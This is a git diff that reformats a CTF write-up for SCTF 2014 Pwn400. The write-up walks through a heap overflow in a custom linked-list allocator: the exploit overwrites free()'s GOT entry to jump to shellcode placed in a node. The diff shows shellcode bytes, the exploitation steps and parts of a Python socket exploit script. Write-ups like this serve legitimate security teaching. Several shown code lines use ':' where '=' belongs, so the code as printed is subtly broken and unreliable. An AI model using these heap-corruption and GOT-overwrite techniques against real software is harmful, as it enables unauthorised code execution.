@@ -1,14 +1,14 @@
 ---
 type: ctf
-title : SCTF 2014 - Pwn400
+title: SCTF 2014 - Pwn400
 tags: [SCTF CTF, pwn400]
-date : 2014-12-08
+date: 2014-12-08
 author: Eno
 featuredImage: https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQiSbw35M3yI5QqN2MsUgkNsNsNFqpbVZdRlA&usqp=CAU
 ---
 
-Similar with Pwn200, Pwn400 gave us a binary file, but no libc.so. Open it with IDA Pro and analyze it, we found some information:
-{/* more */}
+Similar with Pwn200, Pwn400 gave us a binary file, but no libc.so. Open it with IDA Pro and analyze it, we found some
+information: {/* more */}
 
 First, there's a data structure ( let's call it **node** ) which look like this:
 
@@ -23,15 +23,18 @@ struct node{
 };
 
 ```
+
 In this program, we're allow to:
+
 1. New a node
 2. Show a node's address ( yep, no need to leak it! )
 3. Edit a node's content
 4. Delete a node (by giving its address)
 
-Notice that **we can ovewrite a node's data by overflowing its previous node's content**. Moreover, after checking the function of deleting a node, we found the following code:
+Notice that **we can ovewrite a node's data by overflowing its previous node's content**. Moreover, after checking the
+function of deleting a node, we found the following code:
 
-``` c 
+```c
 if ( *(_DWORD *)ptr == ptr )
 {
     if ( *(_DWORD *)a1 == ptr )
@@ -61,21 +64,25 @@ if ( *(_DWORD *)ptr == ptr )
 
 The vulnerability's obvious: **Heap overflow**, except it use its own data structure.
 
-Since it doesn't enable the DEP protection, we can store our shellcode in a known memory address (**which is, in this case, a node's content**), then exploit the heap overflow vulnerability, by overwriting `free()`'s GOT, let the function pointer point to our shellcode. 
+Since it doesn't enable the DEP protection, we can store our shellcode in a known memory address (**which is, in this
+case, a node's content**), then exploit the heap overflow vulnerability, by overwriting `free()`'s GOT, let the function
+pointer point to our shellcode.
 
 For instance:
-``` c
+
+```c
 //free's GOT entry: 0x0804a450
-v1 = node->next // 0x0804a44c, because 0x0804a44c+4 : 0x0804a450  
+v1 = node->next // 0x0804a44c, because 0x0804a44c+4 : 0x0804a450
 v2 : node->prev // shellcode's address
 *(_DWORD *)(shellcode's address + 8) : 0x0804a44c ; //4 bytes of shellcode will be overwritten
 *(_DWORD *)(0x0804a450) : shellcode's address; // overwrite free()'s GOT
 
 ```
 
-Note that 4 bytes in shellcode will be overwritten, so we'll have to use `jmp relative` to skip those 4 bytes machine code. Here's my shellcode:
+Note that 4 bytes in shellcode will be overwritten, so we'll have to use `jmp relative` to skip those 4 bytes machine
+code. Here's my shellcode:
 
-``` python
+```python
 "\x90\x90\x90\x90\x90\x90"+ # NOP
 "\xeb\x08"+ # skip 8 bytes
 "AAAA"+ # overwritten part
@@ -84,15 +91,16 @@ Note that 4 bytes in shellcode will be overwritten, so we'll have to use `jmp re
 ```
 
 So here's the exploitation:
+
 1. New 3 nodes: node1, node2 & node3
 2. Store the shellcode in node3's content
 3. Get the address of node3 & node2, calculate the shellcode's address
 4. Edit node1, overwrite node2's prev & next by overflowing node1's content
-5. Delete node2, overwrite `free()`'s GOT,  execute the shellcode & capture the flag
-    
+5. Delete node2, overwrite `free()`'s GOT, execute the shellcode & capture the flag
+
 Here's the python script. Due to the connection problem, it has to wait 1 second before it recieve server's response.
 
-``` python pwn400.py
+```python pwn400.py
 from socket import *
 import time
 import binascii
@@ -178,7 +186,7 @@ address : int(temp, 16)
 del_addr : hex(address)[2::]
 print "node2 address:", del_addr
 node2_addr_str : binascii.a2b_hex(hex(address)[2:10:].zfill(8))
-print node2_addr_str 
+print node2_addr_str
 
 #BBBB: offset
 #free()'s GOT: 0x0804a450, we send 0x0804a44c
@@ -210,6 +218,8 @@ print sock.recv(1024)
 sock.close()
 ```
 
-The "BBBB" in the exploit is a 4 bytes data between each node. It actually is the meta data of a chunk. The `free()` function will check the meta data before it free the memory of a node. If the meta data isn't correct, the program will crash. But since we overwrite `free()`'s GOT, that meta data's no longer a problem.
+The "BBBB" in the exploit is a 4 bytes data between each node. It actually is the meta data of a chunk. The `free()`
+function will check the meta data before it free the memory of a node. If the meta data isn't correct, the program will
+crash. But since we overwrite `free()`'s GOT, that meta data's no longer a problem.
 
 flag: `SCTF{2318540E78446A0E84EF69685092F0C3}`
